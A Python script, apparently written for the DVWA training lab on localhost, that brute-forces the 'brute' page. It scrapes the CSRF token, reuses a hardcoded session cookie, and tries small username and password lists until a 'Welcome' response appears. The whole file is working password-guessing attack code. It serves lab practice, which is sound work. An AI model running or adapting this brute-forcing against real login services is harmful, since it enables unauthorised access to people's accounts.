import requests
import re

base_url = "http://localhost"
bruteforce_url = "http://localhost/vulnerabilities/brute/"
login_url = "http://localhost/login.php"

usernames = ["admin", "Gordon", "Hack", "Pablo", "Bob"]
passwords = ["doom", "1234", "1111", "password"]

def setup(session):
    response = session.get(login_url, headers={"User-Agent": "Mozilla/5.0 (compatible)"})
    
    if response.status_code != 200:
        print(f"Ошибка запроса: {response.status_code}")
        return None, None
    
    html = response.text
    match = re.search(r'<input\s+type=["\']hidden["\']\s+name=["\']user_token["\']\s+value=["\']([^"\']+)["\']', html)
    
    if match:
        user_token = match.group(1)
        print(f"User Token: {user_token}")
        
        cookies = response.cookies
        php_session_id = cookies.get("PHPSESSID")
        
        if php_session_id:
            print(f"PHPSESSID: {php_session_id}")
        
        return user_token, cookies
    else:
        return None, None

def try_login(session, user_token, php_session_id, username, password):
    params = {
        "username": username,
        "password": password,
        "Login": "Login",
        "user_token": user_token
    }
    
    cookies = {
        "PHPSESSID": php_session_id,
        "security": "low"
    }
    
    response = session.get(bruteforce_url, params=params, cookies=cookies, headers={"User-Agent": "Mozilla/5.0 (compatible)"})
    
    if response.status_code == 302:
        print(f"Редирект (302) после попытки входа с паролем {password}")
        return False
    elif "Welcome" in response.text:
        return True
    else:
        return False

def main():
    session = requests.Session()
    session.cookies.set("PHPSESSID", "h8t6c9k3nh2ivjfv6vc9pv5ar5")
    
    user_token, cookies = setup(session)
    
    if not user_token or not cookies:
        print("Не удалось получить user_token или PHPSESSID")
        return
    
    if not passwords:
        return
    
    for password in passwords:
        for username in usernames:
            success = try_login(session, user_token, cookies.get("PHPSESSID"), username, password)
            if success:
                print(f"[+] Найдено  для {username} найден: {password}")
                
            else:
                print(f"[-] Неверный пароль для {username}: {password}")
    
    print("Все попытки завершены.")

if __name__ == "__main__":
    main()
